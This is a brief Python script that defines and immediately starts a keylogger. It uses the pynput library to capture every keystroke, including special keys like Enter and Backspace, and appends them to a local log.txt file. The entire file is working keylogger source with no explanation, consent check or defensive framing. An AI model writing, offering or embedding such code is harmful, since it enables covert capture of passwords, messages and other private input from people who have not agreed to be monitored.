import pynput.keyboard

class SimpleKeyLogger:
    def __init__(self):
        self.logger = ''  # A variable to store key logs temporarily

    def append_to_log(self, key_strike):
        self.logger += key_strike
        # Write the log to a file and clear it afterward
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)
        self.logger = ''  # Clear the logger after writing to the file

    def evaluate_keys(self, key):
        try:
            # Attempt to get the character representation of the key
            pressed_key = str(key.char)
        except AttributeError:
            # Handle special keys (e.g., space, enter, etc.)
            if key == pynput.keyboard.Key.space:
                pressed_key = ' '  # Replace space key with an actual space
            elif key == pynput.keyboard.Key.enter:
                pressed_key = '\n'  # Replace enter key with a newline
            elif key == pynput.keyboard.Key.backspace:
                pressed_key = ' [BACKSPACE] '  # Add a placeholder for backspace
            else:
                pressed_key = ' [' + str(key) + '] '  # Placeholder for other special keys

        # Add the pressed key to the log
        self.append_to_log(pressed_key)

    def start(self):
        # Start listening for key presses
        with pynput.keyboard.Listener(on_press=self.evaluate_keys) as keyboard_listener:
            keyboard_listener.join()

# Create an instance of the keylogger and start it
SimpleKeyLogger().start()
